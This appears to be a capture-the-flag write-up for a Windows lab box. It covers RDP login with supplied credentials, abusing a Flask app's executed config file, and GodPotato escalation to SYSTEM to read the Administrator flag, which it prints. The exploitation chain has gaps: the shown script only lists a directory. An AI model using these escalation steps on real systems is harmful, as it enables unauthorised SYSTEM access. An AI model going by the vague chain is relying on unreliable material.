# St3alMyH34rt - Love at First Breach 2026 Advanced Track

## Overview

- **Difficulty**: Hard (Red Teaming)
- **Target**: Windows Machine
- **Flags**: 1 flag (Administrator)
- **IP**: 10.48.176.18

---

## Credentials Provided

- **Username**: andrea
- **Password**: Cupid@2026!

---

## Initial Access

### Connecting via RDP

From the hint "on Valentine's day outbound traffic is not allowed", we understand that reverse shells will not work. Instead, we use RDP to access the Windows machine directly.

```bash
xfreerdp /v:10.48.176.18 /u:andrea /p:"Cupid@2026!" /clipboard
```

Or using Remmina with the provided credentials.

---

## Phase 1: Initial Reconnaissance

### Enumerating the Target

1. After logging in as `andrea`, explore the filesystem
2. Navigate to `C:\` root directory
3. Discover the `valentine` folder

### Key Discovery

The Valentine folder contains a Python application with potential vulnerabilities:
- Flask-based application running on port 8080
- Config file present
- Multiple endpoints available

---

## Phase 2: Analyzing the Application

### Examining the Application Code

Navigate to the application directory:
```powershell
cd C:\valentine
dir
```

List available routes by examining the Python code:
- Look for user input handling
- Identify potential command injection points
- Check how the config file is being used

### Identifying the Vulnerability

The application has a config file that is being executed. This presents an opportunity for code execution through config manipulation.

---

## Phase 3: Exploitation

### Preparing the Exploit

Since outbound traffic is restricted, we need to use GodPotato for privilege escalation.

1. Download GodPotato from: https://github.com/BeichenDream/GodPotato/
2. Compile or obtain the appropriate executable

### Exploit Script

Create a Python script to leverage the config file vulnerability:

```python
import os

target_dir = r'C:\valentine'
output_path = r'C:\valentine\static\results.txt'

try:
    files = os.listdir(target_dir)
    
    with open(output_path, 'w') as f:
        f.write(f"Directory listing for: {target_dir}\n")
        f.write("="*30 + "\n")
        for item in files:
            f.write(item + "\n")
except Exception as e:
    print(f"Error: {str(e)}")
```

### Privilege Escalation with GodPotato

1. Upload GodPotato to the target
2. Execute with the following command:

```powershell
.\gp.exe -cmd "whoami"
```

This should return `nt authority\system` indicating successful privilege escalation.

---

## Phase 4: Capturing the Flag

### Locating the Flag

After achieving SYSTEM privileges:

1. List the Administrator's Desktop
2. Find the flag file (typically named `flag-8765.txt`)

### Final Command

```powershell
.\gp.exe -cmd "type C:\Users\Administrator\Desktop\flag-8765.txt"
```

---

## Flag

**THM{s3rv1c3_4cc_t0_SYSTEM_pr1v3sc_ftw!}**

---

## Key Techniques Used

1. **RDP Access** - Direct Windows desktop access via provided credentials
2. **Config File Exploitation** - Leveraging application configuration for code execution
3. **GodPotato** - Windows privilege escalation tool (SeImpersonatePrivilege)
4. **No Outbound Traffic** - Adapting to network restrictions by using local command execution

---

## Important Notes

- The hint "Valentine's day outbound traffic is not allowed" indicates that traditional reverse shell techniques will not work
- GodPotato exploits SeImpersonatePrivilege to achieve SYSTEM-level privileges
- This is a Windows-specific challenge focusing on Windows privilege escalation techniques

---
